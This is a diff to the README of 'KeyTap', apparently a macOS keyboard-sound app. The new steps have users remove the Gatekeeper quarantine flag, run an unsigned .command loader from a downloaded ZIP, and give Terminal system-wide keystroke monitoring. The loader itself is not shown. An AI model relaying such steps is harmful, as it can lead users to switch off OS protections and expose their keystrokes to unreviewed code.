@@ -18,9 +18,19 @@ Getting started is extremely simple and self-contained!
 * **[👉 Click Here to Download KeyTap for macOS (KeyTap_macOS_Download.zip) 👈](https://github.com/SEEHIGHxb/KeyTap-audio-keyboard/raw/main/KeyTap_macOS_Download.zip)**
 * **Instructions:**
   1. Extract the ZIP folder.
-  2. Double-click the **`KeyTap_macOS.command`** loader script in Finder. This will open Terminal and automatically verify your python setup, install necessary libraries, and launch the KeyTap GUI dashboard!
-  3. *Permissions Fix:* If Finder displays an execution error, open terminal in the folder and run: `chmod +x KeyTap_macOS.command`
-  4. 🔒 **macOS Privacy Access Requirement:** To intercept keypresses system-wide in the background, macOS strictly requires you to grant Input Monitoring permissions to the Terminal. Go to: *System Settings ➡️ Privacy & Security ➡️ Input Monitoring* and ensure **Terminal** is enabled!
+  2. **Bypass the macOS Gatekeeper block** (required for unsigned open-source scripts). Since macOS blocks it on first download, choose **one** of these simple ways to approve it:
+     * **Method A (Easiest - Finder):** **Right-click** (or hold `Control` and click) `KeyTap_macOS.command` in Finder, and select **Open** from the menu. When the warning pops up, click the **Open** button to permanently allow it to run.
+     * **Method B (Terminal):** Open the **Terminal** app, paste the following command (with a space at the end):
+       ```bash
+       xattr -d com.apple.quarantine 
+       ```
+       Drag the `KeyTap_macOS.command` file from your Finder window into Terminal to automatically paste its path, and press **Enter**.
+  3. Double-click the **`KeyTap_macOS.command`** loader script in Finder to run it! This opens Terminal, installs any missing libraries (`customtkinter`, `pygame`, `pynput`) automatically, and launches the KeyTap GUI!
+  4. *Permissions Fix:* If Finder says the script cannot be run because you don't have permissions, open Terminal in the folder and run:
+     ```bash
+     chmod +x KeyTap_macOS.command
+     ```
+  5. 🔒 **macOS Privacy Access Requirement:** Because KeyTap intercepts keystrokes system-wide (even when minimized), macOS requires you to grant Input Monitoring access. Go to: **System Settings ➡️ Privacy & Security ➡️ Input Monitoring** and make sure **Terminal** is enabled!
 
 ---
 
